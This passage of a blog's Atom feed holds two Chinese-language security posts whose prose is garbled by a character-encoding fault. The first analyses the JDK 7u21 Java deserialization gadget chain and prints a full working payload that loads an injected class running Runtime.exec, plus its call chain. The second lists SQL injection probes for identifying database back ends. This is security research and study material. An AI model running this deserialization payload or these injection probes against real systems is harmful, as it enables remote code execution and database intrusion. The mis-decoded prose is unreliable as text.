memberValueHashCode(value);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¼šéå†this.memberValueså±æ€§ï¼ˆè¿™ä¸ªå±æ€§å®è´¨ä¸Šå°±æ˜¯HashMapå†…æ·»åŠ çš„å±æ€§ï¼‰ï¼Œç„¶åå¯¹å…¶ä¸­æ¯ä¸€é¡¹é”®å€¼å±æ€§è¿›è¡Œè¿›è¡Œä½è¿ç®—å¹¶ç´¯åŠ </p><p>å…¶ä¸­memberValueHashCodeå‡½æ•°æˆ‘ä»¬ä¹Ÿå¯ä»¥è·Ÿè¿›ä¸€ä¸‹<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330163952543.png" alt="image-20210330163952543"></p><p>å‘ç°åªè¦ä¼ å…¥å‚æ•°ä¸ä¸ºæ•°ç»„ï¼Œå°±è°ƒç”¨å®ƒçš„hashCodeå‡½æ•°å¹¶è¿”å›ã€‚</p><p>æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ï¼Œæ€ä¹ˆæ‰èƒ½è°ƒç”¨åˆ°putæ–¹æ³•é‡Œçš„equalsè§¦å‘ä»£ç æ‰§è¡Œï¼š<br>payloadé˜¶æ®µï¼š</p><p>å»ºç«‹ä¸€ä¸ªmapå˜é‡ï¼Œå…¶keyä¸ºç‰¹æ®Šçš„ä¸€ä¸ªå€¼:f5a5a608,è¿™ä¸ªå€¼çš„hashCodeæ˜¯0ï¼Œç„¶åå€¼ä¸ºæ¶æ„templatesImplç±»ï¼Œç„¶åä»¥è¿™ä¸ªmapå˜é‡ä¸ºå‚æ•°å»ºç«‹AnnotationInvocationHandlerä»£ç†å¯¹è±¡ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330214752872.png" alt="image-20210330214752872"></p><p>å†å‘HashMapé‡Œæ”¾å…¥ä¸€ä¸ªå€¼ï¼Œé”®ä¸ºæ¶æ„TemplatesImplå¯¹è±¡ï¼Œ<br>å†æ”¾å…¥ä¸€ä¸ªå€¼ï¼Œé”®ä¸ºæ¶æ„AnnotationInvocationHandlerå¯¹è±¡ã€‚<br>ï¼ˆLinkedHashSetä¼šè®©HashMapæœ‰åºï¼Œä»è€Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½æŒ‰é¡ºåºä¾æ¬¡ä»HashMapè¯»å–å¯¹è±¡ã€‚å¦‚æœç”¨HashSetï¼Œåˆ™ä¼šåœ¨ååºåˆ—åŒ–æ—¶æŠ¥é”™ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330215307269.png" alt="image-20210330215307269"></p><p>ååºåˆ—åŒ–é˜¶æ®µï¼š    </p><p>éšååœ¨readObjectæ—¶ï¼ŒTemplatesImplå…ˆè¢«putæ–¹æ³•è°ƒç”¨ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134536961.png" alt="image-20210331134536961"></p><p>ç„¶ååœ¨putæ–¹æ³•é‡Œé€šè¿‡hash()æ–¹æ³•è·å¾—å…¶hashï¼Œå¹¶å°†å…¶å½•å…¥åˆ°å®ƒçš„hashå±æ€§é‡Œï¼Œç„¶åå†™å…¥åˆ°HashMapçš„å­˜å‚¨é˜Ÿåˆ—é‡Œã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134644800.png" alt="image-20210331134644800">ç„¶åAnnotationInvocationHandlerå†è¢«putæ–¹æ³•è°ƒç”¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134717624.png" alt="image-20210331134717624">åœ¨å¯¹å…¶ä½¿ç”¨hashæ–¹æ³•è·å¾—hashæ—¶ï¼Œä¼šå› å…¶æ˜¯ä¸€ä¸ªä»£ç†ç±»çš„ç¼˜æ•…åœ¨hashå‡½æ•°å†…éƒ¨è°ƒç”¨hashCode()æ–¹æ³•æ—¶ä¼šè°ƒç”¨å…¶ä»£ç†æ–¹æ³•hashCodeImplã€‚     </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134852582.png" alt="image-20210331134852582"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134859824.png" alt="image-20210331134859824"></p><p>éšååœ¨hashCodeImplå†…éƒ¨éå†this.memberValueså˜é‡ï¼ˆä¹Ÿå°±æ˜¯ä¹‹å‰åˆå§‹åŒ–æ—¶æ”¾å…¥çš„mapå˜é‡ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331135006119.png" alt="image-20210331135006119"></p><p>å°†æ¯ä¸€é¡¹çš„keyå€¼çš„hashCodeä¸ä¼ å…¥map vauleå€¼ä½œä¸ºå‚æ•°çš„memberValueHashCodeæ–¹æ³•è¿›è¡Œå¼‚æˆ–ã€‚<br>è¿™ä¸ªmemberValueHashCodeæ–¹æ³•ä¼šåˆ¤æ–­ä¼ å…¥çš„å€¼æ˜¯å¦ä¸ºæ•°ç»„ï¼Œè‹¥ä¸æ˜¯æ•°ç»„åˆ™ç›´æ¥è¿”å›å‚æ•°çš„hashCode()ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134924166.png" alt="image-20210331134924166"></p><p>å› ä¸ºæˆ‘ä»¬ä¹‹å‰åˆå§‹åŒ–ä»£ç†å¯¹è±¡æ—¶ä¼ å…¥çš„æ˜¯ä¸€ä¸ªé”®ä¸ºf5a5a608ï¼Œå€¼ä¸ºeviltemplatesçš„mapï¼Œæ‰€ä»¥ä»¥ä¸Šhashè®¡ç®—æœ€ç»ˆå¾—åˆ°çš„ç»“æœï¼Œä¾¿æ˜¯0^(templatesImpl.hashCode()). ä¹Ÿå°±æ˜¯templatesImpl.hashCode()ã€‚æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´AnnotationInvocationHandlerå¯¹è±¡ä½œä¸ºå‚æ•°ä¼ å…¥è¢«hashæ–¹æ³•æ‰§è¡Œåçš„ç»“æœï¼Œå°±ç›¸å½“äºæ˜¯hash(eviltemplates)</p><p>éšåè¿™ä¸ªå€¼æ¥åˆ°ifåˆ¤æ–­é€»è¾‘ï¼Œå®ƒéå†ä¹‹å‰çš„å€¼ï¼Œå¹¶å°†éå†å¾—åˆ°çš„å€¼èµ‹ç»™var5</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331135236639.png" alt="image-20210331135236639"></p><p>ä¸Šä¸€ä¸ªå€¼çš„hashï¼ˆä¹Ÿå°±æ˜¯eviltemplatesçš„hashï¼‰ä¸AnnotationInvocationHandlerå¯¹è±¡çš„hashï¼ˆä¹Ÿè¿˜æ˜¯eviltemplatesçš„hashï¼‰ç›¸åŒï¼Œä½†æ˜¯AnnotationInvocationHandlerå¯¹è±¡ä¸eviltemplateså¯¹è±¡å¹¶ä¸ç›¸åŒï¼Œæ‰€ä»¥ä¾¿è§¦åŠ¨äº†equalsï¼Œä»£ç æ‰§è¡ŒæˆåŠŸã€‚</p><h2 id="å®Œæ•´payload"><a href="#å®Œæ•´payload" class="headerlink" title="å®Œæ•´payload"></a>å®Œæ•´payload</h2><p>çºµè§‚ä»¥ä¸Šä¸‰ä¸ªç±»ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºpayload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">      ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">      CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">      String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">      CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc);</span><br><span class="line">      cons.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">      cc.addConstructor(cons);</span><br><span class="line">      cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">      cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line">      byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">      byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">      TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">      Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">      Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">      for (Field Field : Fields) &#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„</span><br><span class="line">          try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯</span><br><span class="line">              Field.setAccessible(true);  &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—®</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                  Field.set(templates,targetByteCodes);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                  Field.set(templates,null);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                  Field.set(templates,&quot;abc&quot;);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                  Field.set(templates,new TemplatesImpl());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      Map map &#x3D; new HashMap();</span><br><span class="line">      String magicStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line">      final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">      ctor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">      InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line">      Object proxy &#x3D;  Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);</span><br><span class="line">      HashSet target &#x3D; new LinkedHashSet();</span><br><span class="line">      target.add(templates);</span><br><span class="line">      target.add(proxy);</span><br><span class="line">      &#x2F;&#x2F;è¿™ä¸ªmapéœ€è¦åœ¨Hashmap putäº†proxyåå†èµ‹å€¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</span><br><span class="line">      map.put(magicStr, templates);</span><br><span class="line">      &#x2F;&#x2F; åºåˆ—åŒ–</span><br><span class="line">      ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(filename));</span><br><span class="line">      oos.writeObject(target);</span><br><span class="line">      &#x2F;&#x2F; ååºåˆ—åŒ–</span><br><span class="line">      ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">      ois.readObject();</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è°ƒç”¨æ ˆ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331140050263.png" alt="image-20210331140050263"></p><p>æ›´ç›´è§‚çš„è°ƒç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                 &#x2F;&#x2F; TemplatesImpl.getOutputProperties()ï¼Œå®é™…æµ‹è¯•æ—¶ä¼šç›´æ¥è°ƒç”¨ newTransformer()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé“¾æ˜¯ç›®å‰è°ƒè¿‡æœ€é•¿çš„äº†â€¦. èƒ½æƒ³å‡ºè¿™ç§é“¾çš„ç»å£æ˜¯å¤©æ‰å§</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;jdk7u21 é“¾ï¼Œæ˜¯ä¸€ä¸ªä¸éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹åº“å°±èƒ½å®ç°çš„é“¾ã€‚å½±å“ç‰ˆæœ¬&amp;lt;=7u21&lt;/p&gt;
&lt;h1 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥åˆ¤æ–­ä¸åŒæ•°æ®åº“çš„tips</title>
    <link href="http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/"/>
    <id>http://const27.com/2021/05/23/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/</id>
    <published>2021-05-23T06:44:46.917Z</published>
    <updated>2021-05-04T07:51:24.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç»éªŒä¹‹è°ˆ"><a href="#ç»éªŒä¹‹è°ˆ" class="headerlink" title="ç»éªŒä¹‹è°ˆ"></a>ç»éªŒä¹‹è°ˆ</h1><p>Aspå’Œ.neté€šå¸¸ä½¿ç”¨sqlserver</p><p>Phpé€šå¸¸ä½¿ç”¨mysqlæˆ–è€…postgresql</p><p>Javaé€šå¸¸æ˜¯oracleæˆ–mysql</p><p>IisæœåŠ¡å™¨æ˜¯åŸºäºwindowsçš„æ¶æ„ï¼Œåå°æ•°æ®åº“æœ‰å¯èƒ½æ˜¯sqlserver</p><p>ApacheæœåŠ¡å™¨ï¼Œå¯èƒ½ä½¿ç”¨å¼€æºæ•°æ®åº“mysqlæˆ–postgresql</p><h1 id="å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥"></a>å­—ç¬¦ä¸²æ‹¼æ¥</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORACLEï¼š&#39;a&#39;||&#39;a&#39; &#x3D;aa</span><br><span class="line">MS-SQLï¼š&#39;a&#39;+&#39;a&#39; &#x3D;aa</span><br><span class="line">MYSQLï¼š&#39;a&#39; &#39;a&#39; &#x3D;aa</span><br></pre></td></tr></table></figure><h1 id="ç‰¹æœ‰å‡½æ•°"><a href="#ç‰¹æœ‰å‡½æ•°" class="headerlink" title="ç‰¹æœ‰å‡½æ•°"></a>ç‰¹æœ‰å‡½æ•°</h1><h2 id="æ—¶é—´å»¶è¿Ÿå‡½æ•°"><a href="#æ—¶é—´å»¶è¿Ÿå‡½æ•°" class="headerlink" title="æ—¶é—´å»¶è¿Ÿå‡½æ•°"></a>æ—¶é—´å»¶è¿Ÿå‡½æ•°</h2><p>oracle: ä½¿ç”¨UTL_HTTPå‘ä¸€ä¸ªä¸å­˜åœ¨çš„ipå‘èµ·é“¾æ¥è¯·æ±‚ï¼Œè‹¥è¿”å›é¡µé¢å¤§å¹…åº¦å»¶è¿Ÿåˆ™å¯åˆ¤å®šä¸ºoracle</p><p>mssql:ä½¿ç”¨è¯­å¥ waitfor delay â€˜0:0:10â€™ è‹¥è¿”å›é¡µé¢å¤§å¹…åº¦å»¶è¿Ÿåˆ™å¯åˆ¤å®šä¸ºmssql</p><p>mysql: sleepå‡½æ•°æ¥äº§ç”Ÿå»¶è¿Ÿ</p><h2 id="mysqlç‰¹æœ‰å‡½æ•°"><a href="#mysqlç‰¹æœ‰å‡½æ•°" class="headerlink" title="mysqlç‰¹æœ‰å‡½æ•°"></a>mysqlç‰¹æœ‰å‡½æ•°</h2><p>BENCHMARK. ç”¨äºæµ‹è¯•ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦<br>select BENCHMARK(1000000,md5(â€˜adminâ€™)) </p><h1 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h1><p>å°è¯•è®©è¯­å¥æŠ¥é”™ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­è·å–æ•°æ®åº“ä¿¡æ¯</p><h1 id="ç‰ˆæœ¬ä¿¡æ¯"><a href="#ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="ç‰ˆæœ¬ä¿¡æ¯"></a>ç‰ˆæœ¬ä¿¡æ¯</h1><p><img src="https://pic4.zhimg.com/v2-69d02936bc7f7769a3709be6aa196f4f_r.jpg" alt="preview"></p><h1 id="ç³»ç»Ÿè¡¨"><a href="#ç³»ç»Ÿè¡¨" class="headerlink" title="ç³»ç»Ÿè¡¨"></a>ç³»ç»Ÿè¡¨</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mssql:(select count(*) from sysobjects)&gt;0</span><br><span class="line">access: (select count(*) from msysobjects)&gt;0</span><br><span class="line">mysql:(select count(*) from information_schema.TABLES)&gt;0</span><br><span class="line">orcle:(select count(*) from sys.user_tables)&gt;0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç»éªŒä¹‹è°ˆ&quot;&gt;&lt;a href=&quot;#ç»éªŒä¹‹è°ˆ&quot; class=&quot;headerlink&quot; title=&quot;ç»éªŒä¹‹è°ˆ&quot;&gt;&lt;/a&gt;ç»éªŒä¹‹è°ˆ&lt;/h1&gt;&lt;p&gt;Aspå’Œ.neté€šå¸¸ä½¿ç”¨sqlserver&lt;/p&gt;
&lt;p&gt;Phpé€šå¸¸ä½¿ç”¨mysqlæˆ–è€…postgresql&lt;/p&gt;
&lt;p&gt;J</summary>
      
    
    
    
    
    <category term="å¤–å›´æ‰“ç‚¹" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
</feed>
